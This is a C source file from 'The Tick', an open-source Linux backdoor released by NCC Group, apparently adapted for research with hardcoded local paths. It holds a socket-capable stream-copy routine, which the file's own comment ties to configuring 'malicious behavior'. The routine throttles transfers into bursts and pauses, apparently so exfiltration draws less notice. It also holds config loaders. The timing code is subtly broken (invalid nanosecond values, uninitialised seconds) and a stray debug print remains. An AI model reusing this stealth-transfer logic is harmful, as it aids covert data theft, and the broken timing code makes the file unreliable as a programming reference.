/*
 * The Tick, a Linux embedded backdoor.
 * 
 * Released as open source by NCC Group Plc - http://www.nccgroup.com/
 * Developed by Mario Vilas, mario.vilas@nccgroup.com
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
 */

#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/statvfs.h>
#include <stdlib.h>
#include <time.h>
#include <limits.h>
#include <string.h>

#include <cjson/cJSON.h>
#include "file.h"

// Helper function to copy a file stream.
// Since uses low lever file descriptors it works with sockets too.
// Optional "count" parameter limits how many bytes to copy,
// use <0 to copy the entire stream. Returns 0 on success, -1 on error.
// "buffersize" determines how much data is sent with each time
// "transferFrequency" determines the pause between sends
// "burstDuration" determines how many sends are done before taking a longer pause determined by "pauseDuration"
int copy_stream(int source, int destination, ssize_t count, const config_t *config)
{

char *buffer = malloc(config->bufferSize);
	if (!buffer) {
		return -1;
	}

	ssize_t copied = 0;
	ssize_t block = 0;
	int counter = 0;

	if (count == 0) {
		free(buffer);
		 return 0;
	}
	printf("haha");
	while (count < 0 || copied < count) {
		block = read(source, buffer, config->bufferSize);
		if (block < 0 || (block == 0 && count > 0 && copied < count)) {
			free(buffer);
			return -1;
		}
		if (block == 0) {
			free(buffer);
			return 0;
		}
		copied = copied + block;
		counter += 1;

		while (block > 0) {
			ssize_t tmp = write(destination, buffer, block);
			if (tmp <= 0) {
				free(buffer);
				return -1;
			}
			block = block - tmp;
		}

		// if it was the last block we skip the pause
		if (count < 0 || copied < count) {
			struct timespec req;

			// if the burstDuration is reached we pause for a longer time
			if (counter % config->burstDuration == 0) {
				req.tv_nsec = config->pauseBetweenBursts * 1000000000;
			}
			// else take a normal requestInterval pause
			else {
				req.tv_nsec = config->transferFrequency * 1000000000;
			}
			nanosleep(&req, NULL);
		}
	}

	free(buffer);
	return 0;
}


// helper function to get config of malicious behavior
cJSON *read_json(const char *fileconfig_identifier) {
	FILE *fp = fopen(fileconfig_identifier, "rb");
	if (!fp) return NULL;
	fseek(fp, 0, SEEK_END);
	long sz = ftell(fp);
	fseek(fp, 0, SEEK_SET);

	char *buf = malloc(sz+1);
	if (!buf) { fclose(fp); return NULL; }
	if (fread(buf, 1, sz, fp) != sz) {
		free(buf); fclose(fp); return NULL;
	}
	buf[sz]='\0';
	fclose(fp);

	cJSON *root = cJSON_Parse(buf);
	free(buf);
	return root;	

}


// fills config struct with data of current config
int load_config(const char* config_identifier, config_t *cfg) {

	if (!config_identifier || !cfg) return -1;

	char file_path[PATH_MAX];
	const char *base_dir = "/home/patrik/BA/server/roar_server/rw-configs/";
	int n = snprintf(file_path, sizeof(file_path), "%sconfig-%s.json", base_dir, config_identifier);
	if (n < 0 || (size_t)n >= sizeof(file_path)) {
		return -2; // path buffer overflow
	}

	cJSON *root = read_json(file_path);
	
	if (!root) {
		return -4; // JSON parse error
	}

	// Extract and validate each field
	cJSON *item = NULL;

	item = cJSON_GetObjectItemCaseSensitive(root, "buffer_size");
	if (cJSON_IsNumber(item)) {
		cfg->bufferSize = item->valueint;
	} else {
		cJSON_Delete(root);
		return -5;
	}

	item = cJSON_GetObjectItemCaseSensitive(root, "transfer_frequency");
	if (cJSON_IsNumber(item)) {
		cfg->transferFrequency = item->valueint;
	} else {
		cJSON_Delete(root);
		return -6;
	}

	item = cJSON_GetObjectItemCaseSensitive(root, "burst_duration");
	if (cJSON_IsNumber(item)) {
		cfg->burstDuration = item->valueint;
	} else {
		cJSON_Delete(root);
		return -7;
	}

	item = cJSON_GetObjectItemCaseSensitive(root, "burst_pause");
	if (cJSON_IsNumber(item)) {
		cfg->pauseBetweenBursts = item->valueint;
	} else {
		cJSON_Delete(root);
		return -8;
	}

	cJSON_Delete(root);
	return 0;	

}


// returns the identifier of the configuration currently in use
char* get_current_config() {
	cJSON *current_config_file = read_json("/home/patrik/BA/config/current_configuration.json");
	
	if (!current_config_file) return NULL;

	cJSON *config = cJSON_GetObjectItemCaseSensitive(current_config_file, "current_config");
	char* return_value = NULL;
	
	if (cJSON_IsString(config) && (config->valuestring != NULL)) {
		return_value = strdup(config->valuestring);
	}

	cJSON_Delete(current_config_file);
	return return_value;
}


// Helper function to get the free space available in a given mount point.
// Returns -1 on error.
ssize_t get_free_space(const char *pathname)
{
	struct statvfs svfs;
	if (statvfs(pathname, &svfs) < 0) return -1;
	return svfs.f_bfree * svfs.f_bsize;
}
